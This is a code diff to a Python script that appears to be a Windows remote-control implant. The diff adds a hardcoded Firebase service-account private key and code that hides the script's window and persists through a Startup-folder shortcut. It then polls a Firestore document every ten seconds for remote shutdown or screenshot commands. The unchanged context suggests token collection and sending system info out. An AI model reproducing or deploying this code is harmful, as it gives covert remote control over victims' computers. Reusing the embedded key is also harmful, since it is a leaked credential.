@@ -20,6 +20,8 @@ import firebase_admin
 from firebase_admin import credentials, firestore
 import pywin32
 import winshell
+import win32com.client
+import time
 
 tokens = []
 cleaned = []
@@ -173,3 +175,63 @@ def send_system_info():
 
 if __name__ == "__main__":
     send_system_info()
+
+# --- 1. CONFIGURATION ---
+# The script will handle this key, store it in the Windows Registry, 
+# and use it to connect to Firebase.
+JSON_DATA = {
+  "type": "service_account",
+  "project_id": "hazack-430e9",
+  "private_key_id": "b9592d559ff9140fe41c3b2f289d562c160f9289",
+  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDlTSHIfm+/+1II\nAlqrUDg67WY4JZ4xZWb2DZA9s4y7lwNzfmkQf9PEMs+kAOpIl3Fi0O9txCYb0mwM\nEvMXHsQcfVvICP4TKDdExmDCI0U5lVq9mXmR36Mcp05DNVZjjeuNpXIiVnoweUMO\nCxmW1BP9VnnIowATtPmFTDQf4nrAIRUSgS+XbDSQLuKFBPoF3REjHSxPEfpPGex+\nxbRT0t5K3tIXVnOgp9T4aq98O8rv8pW5HYc++BgFTclfRkvM7z1eNjiOTmsJAB0i\ngndg/k8GREWDvXRXuyU6yZhnG0EzyYyttjSxQHkibpwV8TYHHXNCM4MxuaudmUK3\nB4HbYCd7AgMBAAECggEAE9HPl7rbVzwWjRFXBkkQHdfN5rspqe9ahO4LMlTGAfjo\nQsqsXia5Bn5ggDaBXvY9cLh1LtxYxugwj/fwrGZBC+Kx/4pMxm8gHSu1yqdYdm+4\na3xL4RX0IqfmFd0TCIEzLl0cjmdBzIAkEZ9X/jd6kC0x/ZZJOBWDyR0bFvPGfxCz\nFO8uAatiT23o5bzt6oQLYLL/m2hH6Ngb8hYQdgKBp98wTcapeZfpz9gQzP9//FQF\n2j5V7qtGy+6i63vtZoMCy2X1c2FIFDL6pbmrShMNyMKNMUWBHGaSlYepttkw7ZRQ\n8N2Hh7iUjjL4hP5pegW2mI6dsyxMyaL53T4qOsaLAQKBgQD0QhsT+FsH2mV/LxMO\nLAJa1jRmthIirk17CsRZx78LrYuxTd18y079Ic4W8DlfYnQJIHb+3mTMvTVxMFLi\nXCSbLLw4fbNcJgwwkJFr6Q1KwMhHxC1ofDlms2EnAhMS/V/KiB410zp6bPZevkj8\nt6S4UOZlTKbb7q2GrmGbKhHFuwKBgQDwUvaHzcNqGttri+mfG/UjsVcHDE4tM6xS\nJBrJkQj2JhldPbGjoz3BKaaZdoOvrjaYPnAc9GPtKqAIq19aBnNDRUwL3/nGmiUs\n+46ZmF/GTlOuhNdfcAX+NypK1mTVyAbxueyT8h0uZZdE92pZaFV7eu7GBSj8ycab\n4IQPkHYpQQKBgD9hwAEImyaIh3nfT0SIKvxDRUm5yS7yp+xbuOPLL0nqeKtDl0vA\nvfh1gzL0lw6nT5DmubodH275UhrS/U77tgwGKblG9PnebZ9UhEfKK8bQC6iDwXyx\nb3u05Gro4OY2lVrKw3wYGb6W879WBT5+sOGbLI3wvAOqBaFDMtS+r+ntAoGAG9Qv\nkhhEqbPEdtazzeXp5CE0B6/oGZnjOXvO0kqGNCLDSyXKvT04+HY/QYQUybItxkFs\nsB2ouJz3/SkDGKSokkCjBrj/7nyJE4VpxOV9KbSGQi5F1lpdh0uSDSp4cL0B+Nnj\nyFoAARBojObtnL7VL0BUCAAu997Rrdk40aiT1kECgYB9keJY0P/CUMgVRTYBr5BI\nSXrM1t5+LF+XT23InIofP+6rrjwxMIre4ZW7FJgqMoOFJlQKreyy09swe1WbZRMb\nY+V//ta60hHcfaKEkCOnq22WPPn34A5KSeaIPdqyOODK3gC1qs5aangI3AuKlBLA\nzpZ3u9MBgGunzqZjYa/TuQ==\n-----END PRIVATE KEY-----\n",
+  "client_email": "firebase-adminsdk-fbsvc@hazack-430e9.iam.gserviceaccount.com",
+  "client_id": "109364286197070150529",
+  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+  "token_uri": "https://oauth2.googleapis.com/token",
+  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
+  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-fbsvc%40hazack-430e9.iam.gserviceaccount.com",
+  "universe_domain": "googleapis.com"
+}
+
+# --- 2. INSTALLATION & HIDING ---
+def run_hidden():
+    if sys.executable.endswith("python.exe"):
+        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
+        os.startfile(f'"{pythonw}" "{os.path.realpath(__file__)}"')
+        sys.exit()
+
+def install_self():
+    # Save key to registry and create startup link
+    key_str = json.dumps(JSON_DATA)
+    os.system(f'setx FIREBASE_KEY "{key_str}" /M')
+    startup = winshell.startup()
+    link = os.path.join(startup, "Agent.lnk")
+    if not os.path.exists(link):
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shortcut = shell.CreateShortCut(link)
+        shortcut.Targetpath = sys.executable.replace("python.exe", "pythonw.exe")
+        shortcut.Arguments = f'"{os.path.realpath(__file__)}"'
+        shortcut.save()
+
+# --- 3. MAIN AGENT ---
+if __name__ == "__main__":
+    run_hidden()
+    if os.environ.get("FIREBASE_KEY") is None: install_self()
+    
+    cred = credentials.Certificate(JSON_DATA)
+    firebase_admin.initialize_app(cred)
+    db = firestore.client()
+    ref = db.collection('servers').document(os.environ['COMPUTERNAME'])
+
+    while True:
+        try:
+            ref.set({'status': 'online'}, merge=True)
+            doc = ref.get().to_dict()
+            if doc and doc.get('command') == 'shutdown':
+                ref.update({'command': None})
+                os.system("shutdown /s /f /t 0")
+            elif doc and doc.get('command') == 'screenshot':
+                pyautogui.screenshot().save("last.png")
+                ref.update({'command': None})
+        except: pass
+        time.sleep(10)
